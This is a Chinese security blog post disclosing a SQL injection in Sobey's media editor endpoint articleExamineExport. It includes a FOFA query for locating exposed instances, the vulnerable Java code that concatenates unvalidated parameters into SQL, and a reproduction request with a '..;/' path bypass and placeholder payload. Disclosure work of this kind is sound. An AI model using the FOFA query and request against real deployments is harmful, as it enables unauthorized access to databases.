---
title: "索贝融媒体 /sobey-mchEditor/mch/Articlelist/articleExamineExport SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-Articlelist-articleExamineExport-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormcharticlelistarticleexamineexport-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/Articlelist/articleExamineExport SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/21 08:23
- 673浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

数据库

软件

安全

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/Articlelist/articleExamineExport 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/Articlelist/articleExamineExport`的实现逻辑

```
@RequestMapping(
    value = {"/articleExamineExport"},
    method = {RequestMethod.GET}
)
public Response articleScorelistExport(HttpServletResponse response, HttpServletRequest request, @RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam(value = "catalogids",required = false) String catalogids, @RequestParam(value = "status",required = false) String status, @RequestParam(value = "createStartTime",required = false) String createStartTime, @RequestParam(value = "endStartTime",required = false) String endStartTime) {
    if (!StringUtils.isEmpty(createStartTime) && !StringUtils.isEmpty(endStartTime)) {
        QueryBuilder qb = new QueryBuilder("select id,title,createUserName,publishDate,author from zcnarticle where 1=1 and status!=0");
        if (StringUtil.isNotEmpty(createStartTime)) {
            createStartTime = createStartTime + " 00:00:00";
            qb.append(" and createDate >= str_to_date(? ,'%Y-%m-%d %H:%i:%s')", createStartTime);
        }

        if (StringUtil.isNotEmpty(endStartTime)) {
            endStartTime = endStartTime + " 23:59:59";
            qb.append(" and createDate <= str_to_date(? ,'%Y-%m-%d %H:%i:%s')", endStartTime);
        }

        if (StringUtil.isNotEmpty(status)) {
            qb.append(" and status in(" + status + ")");
        }

        if (StringUtil.isNotEmpty(catalogids)) {
            qb.append(" and catalogID in(" + catalogids + ")");
        }
```

参数**status**和**catalogids**无任何过滤或校验处理，被直接拼接到qb这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /sobey-mchEditor/js/..;/mch/Articlelist/articleExamineExport?siteCode=1&status=)SQLI_POC&token=1&createStartTime=&endStartTime= HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/Articlelist/articleExamineExport SQL注入漏洞](images/img-001-99f9e97272fa.webp)](https://image.mrxn.net/12d1d301922d4666b0a2c70c3ba33b01.webp)

通过报错注入获取到数据库用户信息

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
